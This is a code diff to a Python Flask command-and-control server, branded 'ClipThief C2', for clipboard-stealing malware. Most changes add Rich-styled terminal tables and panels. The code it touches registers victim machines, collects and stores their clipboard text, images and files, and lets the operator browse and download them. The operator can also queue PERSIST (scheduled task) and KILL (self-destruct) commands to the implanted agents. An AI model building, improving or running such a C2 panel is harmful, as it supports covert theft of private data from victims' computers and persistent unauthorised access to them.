@@ -29,6 +29,18 @@ except ImportError:
     print("[!] Flask not found.  Run:  pip install flask")
     sys.exit(1)
 
+try:
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich.text import Text
+    from rich.syntax import Syntax
+    from rich.prompt import Confirm
+    from rich import box
+except ImportError:
+    print("[!] Rich not found.  Run:  pip install rich")
+    sys.exit(1)
+
 # ============================================================
 #  Paths
 # ============================================================
@@ -44,6 +56,11 @@ app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024
 
 import logging
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
+
+# ============================================================
+#  Rich console  (force_terminal keeps color in all envs)
+# ============================================================
+console = Console(highlight=False)
 
 # ============================================================
 #  In-memory state  (loaded from DB on startup)
@@ -62,7 +79,6 @@ AGENT_TIMEOUT_SEC = 10
 # ============================================================
 
 def db_connect() -> sqlite3.Connection:
-    """Open a thread-local DB connection with WAL mode."""
     conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
     conn.row_factory = sqlite3.Row
     conn.execute("PRAGMA journal_mode=WAL")
@@ -70,7 +86,6 @@ def db_connect() -> sqlite3.Connection:
     return conn
 
 def db_init():
-    """Create tables if they don't exist and load agents into memory."""
     conn = db_connect()
     conn.executescript("""
         CREATE TABLE IF NOT EXISTS agents (
@@ -83,7 +98,6 @@ def db_init():
             last_seen  TEXT,
             status     TEXT
         );
-
         CREATE TABLE IF NOT EXISTS clipboard_entries (
             rowid      INTEGER PRIMARY KEY AUTOINCREMENT,
             agent_id   TEXT NOT NULL,
@@ -96,13 +110,11 @@ def db_init():
         );
     """)
     conn.commit()
-
-    # Load existing agents into memory
     for row in conn.execute("SELECT * FROM agents").fetchall():
         agents[row["id"]] = dict(row)
-
     conn.close()
-    print(f"[*] Database: {DB_PATH}  ({len(agents)} agents loaded)")
+    console.print(f"[dim][[*]][/] Database: [cyan]{DB_PATH}[/]  "
+                  f"([yellow]{len(agents)}[/] agents loaded)")
 
 def db_upsert_agent(info: dict):
     conn = db_connect()
@@ -131,9 +143,7 @@ def db_get_clips(agent_id: str) -> list:
     conn = db_connect()
     rows = conn.execute("""
         SELECT seq, type, content, filename, timestamp
-        FROM clipboard_entries
-        WHERE agent_id = ?
-        ORDER BY seq
+        FROM clipboard_entries WHERE agent_id = ? ORDER BY seq
     """, (agent_id,)).fetchall()
     conn.close()
     return [{"id": r["seq"], "type": r["type"], "content": r["content"],
@@ -142,23 +152,19 @@ def db_get_clips(agent_id: str) -> list:
 def db_next_seq(agent_id: str) -> int:
     conn = db_connect()
     row = conn.execute("""
-        SELECT COALESCE(MAX(seq), 0) + 1 AS next FROM clipboard_entries WHERE agent_id = ?
+        SELECT COALESCE(MAX(seq), 0) + 1 AS next
+        FROM clipboard_entries WHERE agent_id = ?
     """, (agent_id,)).fetchone()
     conn.close()
     return row["next"]
 
 def db_clear_all():
-    """Delete every row from both tables."""
     conn = db_connect()
-    conn.executescript("""
-        DELETE FROM clipboard_entries;
-        DELETE FROM agents;
-    """)
+    conn.executescript("DELETE FROM clipboard_entries; DELETE FROM agents;")
     conn.commit()
     conn.close()
 
 def db_clear_agent(agent_id: str):
-    """Delete one agent and all their clipboard entries."""
     conn = db_connect()
     conn.execute("DELETE FROM clipboard_entries WHERE agent_id = ?", (agent_id,))
     conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
@@ -195,15 +201,15 @@ def api_register():
             agents[agent_id]["last_seen"] = now
             agents[agent_id]["status"]    = "active"
             info = agents[agent_id]
-
         db_upsert_agent(info)
 
     if is_new:
         _notify_new_agent(info)
         new_agent_queue.put(agent_id)
     else:
-        _notify(f"[~] AGENT RECONNECTED  "
-                f"{info['user']}@{info['hostname']}  ({agent_id[:8]}...)")
+        _notify("reconnect",
+                f"AGENT RECONNECTED  {info['user']}@{info['hostname']}  "
+                f"({agent_id[:8]}...)")
 
     return jsonify({"status": "ok"})
 
@@ -223,10 +229,11 @@ def api_clipboard(agent_id):
             agents[agent_id]["last_seen"] = now
             db_upsert_agent(agents[agent_id])
 
-    entry   = {"id": seq, "type": clip_type, "content": content,
-               "filename": filename, "timestamp": now}
-    icon    = {"text": "[TXT]", "image": "[IMG]", "file": "[FILE]"}.get(clip_type, "[?]")
-    _notify(f"  {icon} clip from {agent_id[:8]}...  {_clip_preview(entry)}")
+    entry = {"id": seq, "type": clip_type, "content": content,
+             "filename": filename, "timestamp": now}
+    _notify("clip",
+            f"clip from {agent_id[:8]}...  {_clip_preview(entry)}",
+            clip_type=clip_type)
 
     return jsonify({"status": "ok"})
 
@@ -238,7 +245,6 @@ def api_command(agent_id):
             agents[agent_id]["last_seen"] = _now()
             db_upsert_agent(agents[agent_id])
         cmd = pending_cmds.pop(agent_id, "none")
-
     return jsonify({"command": cmd})
 
 
@@ -251,29 +257,54 @@ def _now() -> str:
 
 _ui_lock = threading.Lock()
 
-def _notify(msg: str):
+# Clipboard type → (rich style, label)
+_TYPE_META = {
+    "text":  ("cyan",   "[TXT] "),
+    "image": ("yellow", "[IMG] "),
+    "file":  ("green",  "[FILE]"),
+}
+
+def _notify(kind: str, msg: str, clip_type: str = ""):
+    """Thread-safe colored notification to terminal."""
     with _ui_lock:
-        print(f"\n  {msg}")
+        if kind == "dead":
+            console.print(f"\n  [bold red][!] {msg}[/]")
+        elif kind == "reconnect":
+            console.print(f"\n  [bold yellow][~] {msg}[/]")
+        elif kind == "clip":
+            style, label = _TYPE_META.get(clip_type, ("white", "[?]   "))
+            console.print(f"\n  [{style}]{label}[/]  {msg}")
+        else:
+            console.print(f"\n  {msg}")
+
 
 def _notify_new_agent(a: dict):
-    W = 52
-    def row(label: str, value: str) -> str:
-        cell = f"{label}: {value}"[:W]
-        return f"  \u2551  {cell:<{W}}  \u2551"
+    """Rich Panel notification for a newly connected agent."""
+    content = Text()
+    content.append("ID:       ", style="bold white")
+    content.append(a["id"] + "\n", style="yellow")
+    content.append("User:     ", style="bold white")
+    content.append(a["user"] + "\n", style="bold green")
+    content.append("Hostname: ", style="bold white")
+    content.append(a["hostname"] + "\n", style="cyan")
+    content.append("IP:       ", style="bold white")
+    content.append(a["ip"] + "\n", style="cyan")
+    content.append("OS:       ", style="bold white")
+    content.append(a["os"] + "\n", style="dim")
+    content.append("Time:     ", style="bold white")
+    content.append(a["first_seen"], style="dim")
+
     with _ui_lock:
-        print()
-        print(f"  \u2554{'=' * (W + 4)}\u2557")
-        print(f"  \u2551{'  *** NEW AGENT CONNECTED ***':^{W + 4}}\u2551")
-        print(f"  \u2560{'=' * (W + 4)}\u2563")
-        print(row("ID      ", a["id"]))
-        print(row("User    ", a["user"]))
-        print(row("Hostname", a["hostname"]))
-        print(row("IP      ", a["ip"]))
-        print(row("OS      ", a["os"]))
-        print(row("Time    ", a["first_seen"]))
-        print(f"  \u255a{'=' * (W + 4)}\u255d")
-        print("  Press Enter to open agent menu...")
-        print()
+        console.print()
+        console.print(Panel(
+            content,
+            title="[bold red]★  NEW AGENT CONNECTED  ★[/]",
+            border_style="red",
+            expand=False,
+            padding=(1, 4),
+        ))
+        console.print("  [dim]Press Enter to open agent menu...[/]\n")
+
 
 def _clip_preview(entry: dict) -> str:
     if entry["type"] == "text":
@@ -283,6 +314,22 @@ def _clip_preview(entry: dict) -> str:
         except Exception:
             return "(decode error)"
     return entry.get("filename") or "(binary)"
+
+
+def _detect_lang(text: str) -> str:
+    """Guess syntax language for rich.Syntax highlighting."""
+    t = text.strip()
+    if t.startswith(("{", "[")):
+        return "json"
+    up = t.upper()
+    if any(k in up for k in ("SELECT ", "INSERT ", "UPDATE ", "DELETE ", "CREATE ", "DROP ")):
+        return "sql"
+    if any(k in t for k in ("def ", "import ", "class ", "print(", "if __name__")):
+        return "python"
+    if t.startswith("<") and ">" in t:
+        return "xml"
+    return "text"
+
 
 def _save_clip_to_disk(agent_id: str, entry: dict) -> Path:
     DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
@@ -294,6 +341,7 @@ def _save_clip_to_disk(agent_id: str, entry: dict) -> Path:
     fpath.write_bytes(base64.b64decode(entry["content"]))
     return fpath
 
+
 def _open_file(path: Path):
     try:
         if sys.platform == "win32":
@@ -303,7 +351,8 @@ def _open_file(path: Path):
         else:
             os.system(f'xdg-open "{path}"')
     except Exception as e:
-        print(f"  [!] Cannot open: {e}")
+        console.print(f"  [red][!] Cannot open: {e}[/]")
+
 
 # ============================================================
 #  Terminal UI — helpers
@@ -312,13 +361,13 @@ def _open_file(path: Path):
 def _clear():
     os.system("cls" if os.name == "nt" else "clear")
 
-_CEYCEY = """
 
+_CEYCEY = """
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⣿⣿
 ⡿⠟⠫⠋⢉⣁⣉⡉⠉⠉⠋⠛⣿⣿⣿⡛⠋⠋⠉⠉⣁⣈⣉⡐⠩⠛⢻
 ⣷⣦⣶⣿⡿⠯⠭⠭⠭⠭⣝⢻⣿⣿⣿⡿⢫⠭⠭⠭⠭⠭⠿⣿⣷⣦⣼
 ⣿⣿⣿⣩⡚⠃⢀⠀⡘⠌⢻⣸⣿⣿⣿⣷⣼⣋⢚⢀⣀⢀⠛⣊⣽⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿    Be careful what you copy. 
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿     Be careful what you copy.
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣿⡟⣸⣿⣿⣿
@@ -327,15 +376,17 @@ _CEYCEY = """
 """
 
 def _banner():
-    print(_CEYCEY)
-    print("=" * 55)
-    print("       ClipThief C2 Server  |  @erberkan / B3R-SEC")
-    print("=" * 55)
-    print()
+    console.print(_CEYCEY)
+    console.print("=" * 55)
+    console.print("  [bold cyan]ClipThief C2 Server[/]  [dim]|[/]  [dim]@erberkan / B3R-SEC[/]")
+    console.print("=" * 55)
+    console.print()
+
 
 def _input(prompt: str) -> str:
     with _ui_lock:
-        return input(prompt).strip()
+        return console.input(prompt).strip()
+
 
 # ============================================================
 #  Terminal UI — screens
@@ -344,21 +395,43 @@ def _input(prompt: str) -> str:
 def screen_agent_list() -> list:
     _clear()
     _banner()
+
     with db_lock:
         agent_list = list(agents.values())
 
     if not agent_list:
-        print("  No agents in database.\n")
+        console.print("  [dim]No agents in database.[/]\n")
         return agent_list
 
-    print(f"  {'#':<4} {'ID (short)':<10} {'USER':<16} {'HOSTNAME':<20}"
-          f" {'IP':<16} {'LAST SEEN':<20} STATUS")
-    print("  " + "-" * 92)
+    table = Table(
+        box=box.ROUNDED,
+        header_style="bold cyan",
+        border_style="bright_black",
+        show_lines=False,
+        expand=False,
+    )
+    table.add_column("#",         style="dim",    width=4,  justify="right")
+    table.add_column("ID",                        width=12)
+    table.add_column("USER",                      width=16)
+    table.add_column("HOSTNAME",                  width=20)
+    table.add_column("IP",                        width=16)
+    table.add_column("LAST SEEN",                 width=21)
+    table.add_column("STATUS",                    width=10)
+
     for i, a in enumerate(agent_list, 1):
         short = a["id"][:8] + "..."
-        print(f"  {i:<4} {short:<10} {a['user']:<16} {a['hostname']:<20}"
-              f" {a['ip']:<16} {a['last_seen']:<20} {a['status']}")
-    print()
+        if a["status"] == "active":
+            status_text = Text("● active", style="bold green")
+        else:
+            status_text = Text("✗ dead",   style="bold red")
+
+        table.add_row(
+            str(i), short, a["user"], a["hostname"],
+            a["ip"], a["last_seen"], status_text,
+        )
+
+    console.print(table)
+    console.print()
     return agent_list
 
 
@@ -371,52 +444,85 @@ def screen_agent_menu(agent_id: str):
             a = agents.get(agent_id)
 
         if not a:
-            print("  [!] Agent not found in database.")
+            console.print("  [bold red][!] Agent not found in database.[/]")
             _input("  Press Enter...")
             return
 
         clips = db_get_clips(agent_id)
 
-        print(f"  Agent     : {a['id']}")
-        print(f"  User      : {a['user']}")
-        print(f"  Hostname  : {a['hostname']}")
-        print(f"  IP        : {a['ip']}")
-        print(f"  OS        : {a['os']}")
-        print(f"  First seen: {a['first_seen']}")
-        print(f"  Last seen : {a['last_seen']}")
-        print(f"  Status    : {a['status']}")
-        print(f"  Clipboard entries: {len(clips)}")
-        print()
-        print("  [1] View clipboard history")
-        print("  [2] Send KILL command  (self-destruct + delete)")
-        print("  [3] Send PERSIST command  (add scheduled task)")
-        print("  [4] Delete this agent from DB")
-        print("  [0] Back")
-        print()
+        # ── Agent info panel ──────────────────────────────────
+        status_style = "bold green" if a["status"] == "active" else "bold red"
+        status_icon  = "●" if a["status"] == "active" else "✗"
 
-        choice = _input("  > ")
+        info = Text()
+        info.append("Agent ID:  ", style="bold white")
+        info.append(a["id"] + "\n", style="yellow")
+        info.append("User:      ", style="bold white")
+        info.append(a["user"] + "\n", style="bold green")
+        info.append("Hostname:  ", style="bold white")
+        info.append(a["hostname"] + "\n", style="cyan")
+        info.append("IP:        ", style="bold white")
+        info.append(a["ip"] + "\n", style="cyan")
+        info.append("OS:        ", style="bold white")
+        info.append(a["os"] + "\n", style="dim")
+        info.append("First seen:", style="bold white")
+        info.append(" " + a["first_seen"] + "\n", style="dim")
+        info.append("Last seen: ", style="bold white")
+        info.append(a["last_seen"] + "\n", style="dim")
+        info.append("Status:    ", style="bold white")
+        info.append(f"{status_icon} {a['status']}\n", style=status_style)
+        info.append("Clipboard: ", style="bold white")
+        info.append(f"{len(clips)} entries", style="bold cyan")
+
+        console.print(Panel(info, title="[bold cyan]Agent Details[/]",
+                            border_style="cyan", expand=False, padding=(0, 2)))
+        console.print()
+
+        # ── Menu ─────────────────────────────────────────────
+        console.print("  [bold cyan]\\[1][/] View clipboard history")
+        console.print("  [bold red]\\[2][/] Send KILL command  [dim](self-destruct + delete)[/]")
+        console.print("  [bold yellow]\\[3][/] Send PERSIST command  [dim](add scheduled task)[/]")
+        console.print("  [white]\\[4][/] Delete this agent from DB")
+        console.print("  [dim]\\[0] Back[/]")
+        console.print()
+
+        choice = _input("  [bold]>[/] ")
 
         if choice == "1":
             screen_clipboard_list(agent_id)
+
         elif choice == "2":
-            if _input("  Confirm KILL? (yes/no): ").lower() == "yes":
+            with _ui_lock:
+                confirmed = Confirm.ask(
+                    "  [bold red]Send KILL command? This will destroy the agent[/]",
+                    default=False,
+                )
+            if confirmed:
                 with db_lock:
                     pending_cmds[agent_id] = "kill"
-                print("  [+] KILL queued.")
+                console.print("  [bold green][+] KILL queued.[/]")
                 _input("  Press Enter...")
+
         elif choice == "3":
             with db_lock:
                 pending_cmds[agent_id] = "persist"
-            print("  [+] PERSIST queued.")
+            console.print("  [bold green][+] PERSIST queued.[/]")
             _input("  Press Enter...")
+
         elif choice == "4":
-            if _input("  Delete agent + all clipboard data? (yes/no): ").lower() == "yes":
+            with _ui_lock:
+                confirmed = Confirm.ask(
+                    "  [bold red]Delete agent + all clipboard data?[/]",
+                    default=False,
+                )
+            if confirmed:
                 with db_lock:
                     agents.pop(agent_id, None)
                 db_clear_agent(agent_id)
-                print("  [+] Agent removed from database.")
+                console.print("  [bold green][+] Agent removed from database.[/]")
                 _input("  Press Enter...")
                 return
+
         elif choice == "0":
             return
 
@@ -429,27 +535,51 @@ def screen_clipboard_list(agent_id: str):
         clips = db_get_clips(agent_id)
 
         if not clips:
-            print("  No clipboard data.\n")
+            console.print("  [dim]No clipboard data.[/]\n")
             _input("  Press Enter...")
             return
 
-        print(f"  Clipboard — {agent_id[:8]}...  ({len(clips)} entries)\n")
-        print(f"  {'#':<5} {'TYPE':<6} {'TIMESTAMP':<22} PREVIEW / FILENAME")
-        print("  " + "-" * 80)
-        for e in clips[-50:]:
-            print(f"  {e['id']:<5} {e['type']:<6} {e['timestamp']:<22} {_clip_preview(e)[:52]}")
-        print()
-        print("  <n>  view    D <n>  download    0  back")
-        print()
+        table = Table(
+            title=f"[bold]Clipboard[/] — [yellow]{agent_id[:8]}...[/]  "
+                  f"[dim]({len(clips)} entries)[/]",
+            box=box.ROUNDED,
+            header_style="bold cyan",
+            border_style="bright_black",
+            show_lines=False,
+            expand=False,
+        )
+        table.add_column("#",                   width=5,  justify="right", style="dim")
+        table.add_column("TYPE",                width=7)
+        table.add_column("TIMESTAMP",           width=21, style="dim")
+        table.add_column("PREVIEW / FILENAME")
 
-        choice = _input("  > ")
+        for e in clips[-50:]:
+            style, label = _TYPE_META.get(e["type"], ("white", "[?]   "))
+            table.add_row(
+                str(e["id"]),
+                Text(label, style=style),
+                e["timestamp"],
+                _clip_preview(e)[:60],
+            )
+
+        console.print(table)
+        console.print()
+        console.print(
+            "  [dim]<n>[/] view    [dim]D <n>[/] download    [dim]0[/] back"
+        )
+        console.print()
+
+        choice = _input("  [bold]>[/] ")
+
         if choice == "0":
             return
+
         if choice.upper().startswith("D "):
             try:
                 _download_entry(agent_id, int(choice.split()[1]), clips)
             except (IndexError, ValueError):
-                pass
+                console.print("  [red]Usage: D <number>[/]")
+                _input("  Press Enter...")
         else:
             try:
                 screen_view_entry(agent_id, int(choice), clips)
@@ -460,82 +590,134 @@ def screen_clipboard_list(agent_id: str):
 def screen_view_entry(agent_id: str, clip_id: int, clips: list):
     entry = next((e for e in clips if e["id"] == clip_id), None)
     if not entry:
-        print(f"  [!] Entry #{clip_id} not found.")
+        console.print(f"  [red][!] Entry #{clip_id} not found.[/]")
         _input("  Press Enter...")
         return
 
     _clear()
     _banner()
-    print(f"  Entry #{clip_id}  |  {entry['type']}  |  {entry['timestamp']}\n")
+
+    style, label = _TYPE_META.get(entry["type"], ("white", "[?]"))
+    console.print(Panel(
+        f"[{style}]{label}[/]  [dim]{entry['timestamp']}[/]",
+        title=f"[bold]Entry #{clip_id}[/]",
+        border_style=style,
+        expand=False,
+    ))
+    console.print()
 
     if entry["type"] == "text":
         try:
             text = base64.b64decode(entry["content"]).decode("utf-8", errors="replace")
         except Exception as ex:
             text = f"(decode error: {ex})"
-        print("  " + "-" * 70)
-        for line in text.splitlines():
-            print("  " + line)
-        print("  " + "-" * 70)
+
+        lang = _detect_lang(text)
+        if lang != "text":
+            console.print(Syntax(text, lang, theme="monokai",
+                                 line_numbers=True, word_wrap=True))
+        else:
+            # Plain text in a dim panel
+            console.print(Panel(text, border_style="bright_black", expand=False))
     else:
         try:
             saved = _save_clip_to_disk(agent_id, entry)
-            print(f"  [+] Saved: {saved}")
+            console.print(f"  [bold green][+][/] Saved: [cyan]{saved}[/]")
             _open_file(saved)
         except Exception as ex:
-            print(f"  [!] {ex}")
+            console.print(f"  [red][!] {ex}[/]")
 
-    print()
+    console.print()
     _input("  Press Enter...")
 
 
 def _download_entry(agent_id: str, clip_id: int, clips: list):
     entry = next((e for e in clips if e["id"] == clip_id), None)
     if not entry:
-        print(f"  [!] Entry #{clip_id} not found.")
+        console.print(f"  [red][!] Entry #{clip_id} not found.[/]")
         _input("  Press Enter...")
         return
     try:
         saved = _save_clip_to_disk(agent_id, entry)
-        print(f"  [+] Downloaded: {saved}  ({saved.stat().st_size:,} bytes)")
+        console.print(
+            f"  [bold green][+][/] Downloaded: [cyan]{saved}[/]  "
+            f"[dim]({saved.stat().st_size:,} bytes)[/]"
+        )
     except Exception as ex:
-        print(f"  [!] {ex}")
+        console.print(f"  [red][!] {ex}[/]")
     _input("  Press Enter...")
 
 
 def screen_db_menu():
-    """Database management screen."""
     while True:
         _clear()
         _banner()
 
-        conn   = db_connect()
-        n_ag   = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
-        n_cl   = conn.execute("SELECT COUNT(*) FROM clipboard_entries").fetchone()[0]
-        db_sz  = DB_PATH.stat().st_size if DB_PATH.exists() else 0
+        conn  = db_connect()
+        n_ag  = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
+        n_cl  = conn.execute("SELECT COUNT(*) FROM clipboard_entries").fetchone()[0]
+        db_sz = DB_PATH.stat().st_size if DB_PATH.exists() else 0
         conn.close()
 
-        print(f"  Database : {DB_PATH}")
-        print(f"  Size     : {db_sz:,} bytes")
-        print(f"  Agents   : {n_ag}")
-        print(f"  Clipboard: {n_cl} entries")
-        print()
-        print("  [1] Clear ALL data  (agents + clipboard)")
-        print("  [0] Back")
-        print()
+        stats = Text()
+        stats.append("Path:      ", style="bold white")
+        stats.append(str(DB_PATH) + "\n", style="dim")
+        stats.append("Size:      ", style="bold white")
+        stats.append(f"{db_sz:,} bytes\n", style="cyan")
+        stats.append("Agents:    ", style="bold white")
+        stats.append(f"{n_ag}\n", style="bold green")
+        stats.append("Clipboard: ", style="bold white")
+        stats.append(f"{n_cl} entries", style="bold yellow")
 
-        choice = _input("  > ")
+        console.print(Panel(stats, title="[bold]Database[/]",
+                            border_style="bright_black", expand=False, padding=(0, 2)))
+        console.print()
+        console.print("  [bold red]\\[1][/] Clear ALL data  [dim](agents + clipboard)[/]")
+        console.print("  [dim]\\[0] Back[/]")
+        console.print()
+
+        choice = _input("  [bold]>[/] ")
+
         if choice == "1":
-            confirm = _input("  Type YES to confirm full wipe: ")
-            if confirm == "YES":
+            with _ui_lock:
+                confirmed = Confirm.ask(
+                    "  [bold red]Wipe entire database?[/]",
+                    default=False,
+                )
+            if confirmed:
                 db_clear_all()
                 with db_lock:
                     agents.clear()
                     pending_cmds.clear()
-                print("  [+] Database cleared.")
+                console.print("  [bold green][+] Database cleared.[/]")
                 _input("  Press Enter...")
         elif choice == "0":
             return
+
+
+# ============================================================
+#  Heartbeat monitor — agent timeout detection
+# ============================================================
+
+def _heartbeat_monitor():
+    fmt = "%Y-%m-%d %H:%M:%S"
+    while True:
+        time.sleep(5)
+        now = datetime.now()
+        with db_lock:
+            for agent_id, a in agents.items():
+                if a["status"] == "dead":
+                    continue
+                try:
+                    elapsed = (now - datetime.strptime(a["last_seen"], fmt)).total_seconds()
+                except ValueError:
+                    continue
+                if elapsed > AGENT_TIMEOUT_SEC:
+                    a["status"] = "dead"
+                    db_upsert_agent(a)
+                    _notify("dead",
+                            f"AGENT DEAD  {a['user']}@{a['hostname']}  "
+                            f"({agent_id[:8]}...)  — last seen {int(elapsed)}s ago")
 
 
 # ============================================================
@@ -546,7 +728,6 @@ def run_terminal_ui():
     time.sleep(0.8)
 
     while True:
-        # Auto-navigate when a new agent arrives
         try:
             agent_id = new_agent_queue.get_nowait()
             screen_agent_menu(agent_id)
@@ -556,16 +737,16 @@ def run_terminal_ui():
 
         agent_list = screen_agent_list()
 
-        print("  [N]  Select agent by number")
-        print("  [D]  Database management")
-        print("  [R]  Refresh")
-        print("  [Q]  Quit")
-        print()
+        console.print("  [bold cyan]\\[N][/]  Select agent by number")
+        console.print("  [bold cyan]\\[D][/]  Database management")
+        console.print("  [bold cyan]\\[R][/]  Refresh")
+        console.print("  [bold cyan]\\[Q][/]  Quit")
+        console.print()
 
-        choice = _input("  > ").upper()
+        choice = _input("  [bold]>[/] ").upper()
 
         if choice == "Q":
-            print("\n  [*] Shutting down...\n")
+            console.print("\n  [dim]Shutting down...[/]\n")
             os._exit(0)
         elif choice == "D":
             screen_db_menu()
@@ -581,35 +762,6 @@ def run_terminal_ui():
 
 
 # ============================================================
-#  Heartbeat monitor — agent timeout detection
-# ============================================================
-
-def _heartbeat_monitor():
-    """Background thread: marks agents as 'dead' if polling stops."""
-    fmt = "%Y-%m-%d %H:%M:%S"
-    while True:
-        time.sleep(5)
-        now = datetime.now()
-        with db_lock:
-            for agent_id, a in agents.items():
-                if a["status"] == "dead":
-                    continue
-                try:
-                    last = datetime.strptime(a["last_seen"], fmt)
-                    elapsed = (now - last).total_seconds()
-                except ValueError:
-                    continue
-
-                if elapsed > AGENT_TIMEOUT_SEC:
-                    a["status"] = "dead"
-                    db_upsert_agent(a)
-                    _notify(f"[!] AGENT DEAD  "
-                            f"{a['user']}@{a['hostname']}  "
-                            f"({agent_id[:8]}...)  "
-                            f"— last seen {int(elapsed)}s ago")
-
-
-# ============================================================
 #  Entry point
 # ============================================================
 
@@ -622,8 +774,7 @@ def main():
     DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
     db_init()
 
-    print(f"[*] Listening on {args.host}:{args.port}")
-    print()
+    console.print(f"[dim][[*]][/] Listening on [cyan]{args.host}:{args.port}[/]\n")
 
     threading.Thread(
         target=lambda: app.run(
